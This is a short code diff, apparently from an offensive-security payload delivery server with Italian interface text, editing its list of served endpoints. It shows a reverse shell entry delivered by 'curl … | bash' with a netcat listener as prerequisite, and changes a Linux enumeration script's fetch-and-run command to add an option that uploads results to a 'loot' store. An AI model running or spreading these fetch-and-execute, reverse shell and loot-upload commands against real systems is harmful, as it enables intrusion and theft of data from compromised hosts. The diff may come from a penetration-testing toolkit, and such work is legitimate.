@@ -2000,8 +2000,8 @@ def _page_delivery() -> str:
         ("sh", "Reverse Shell Python", "One-liner Python3 per reverse shell (utile quando bash non ha /dev/tcp)",
          f"curl {base}/sh | bash",
          f"Prerequisito: <code>nc -lvnp {_lport}</code>"),
-        ("static/linseal.sh", "LinSeal", "Enumerazione Linux leggera — alternativa a linpeas, nessuna dipendenza, zero broken pipe",
-         f"curl {base}/static/linseal.sh | sh",
+        ("static/linseal.sh", "LinSeal", "Enumerazione Linux leggera — alternativa a linpeas, zero broken pipe. Opzioni: -o [file] salva output, -s silenzioso, -l upload in loot",
+         f"curl {base}/static/linseal.sh | sh -s -- -o -l",
          "Nessun prerequisito — POSIX sh puro"),
     ]
     for key, title, desc, curl_cmd, prereq in endpoints:
